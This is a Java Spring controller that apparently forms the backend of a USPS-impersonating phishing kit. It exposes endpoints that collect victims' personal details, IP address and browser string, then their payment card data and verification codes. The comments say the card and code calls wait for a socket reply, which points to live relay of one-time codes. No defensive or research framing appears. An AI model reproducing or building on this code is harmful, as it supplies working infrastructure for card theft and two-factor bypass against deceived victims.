package com.uspsassa.phishing.controller;
import com.uspsassa.phishing.common.result.Result;
import com.uspsassa.phishing.request.user.AddFishBaseRequest;
import com.uspsassa.phishing.request.user.AddFishCardRequest;
import com.uspsassa.phishing.request.user.AddFishCodeRequest;
import com.uspsassa.phishing.service.FishService;
import com.uspsassa.phishing.vo.FishVo;
import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.tags.Tag;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

@RestController
@RequestMapping("user")
@Tag(name = "用户模块")
public class UserController {
    @Resource
    FishService fishService;
    @Operation(summary = "添加基本信息", description = "返回全部信息")
    @PostMapping("addBaseInfo")
    public Result<FishVo> addBaseInfo(@RequestBody @Validated AddFishBaseRequest baseInfo, HttpServletRequest request) throws IOException {
        String ua = request.getHeader("User-Agent");
        //获取ip
        String ip = request.getRemoteAddr();
        return Result.success(fishService.addBaseInfo(baseInfo, ua,ip));
    }
    @Operation(summary = "添加卡信息 ", description = "不返回 等待socket返回信息")
    @PostMapping("addCardInfo")
    public Result<Void> addCardInfo(@RequestBody @Validated AddFishCardRequest cardRequest) throws IOException {
        fishService.addCardInfo(cardRequest);
        return Result.success();
    }
    @Operation(summary = "添加验证码信息", description = "不返回 等待socket返回")
    @PostMapping("addCodeInfo")
    public Result<Void> addCodeInfo(@RequestBody @Validated AddFishCodeRequest codeRequest) throws IOException {
        fishService.addCodeInfo(codeRequest);
        return Result.success();
    }
    @Operation(summary = "随便一个接口 校验",description = "用于测试是否可正常访问")
    @PostMapping("check")
    public Result<Void> check(){
        return Result.success();
    }
}
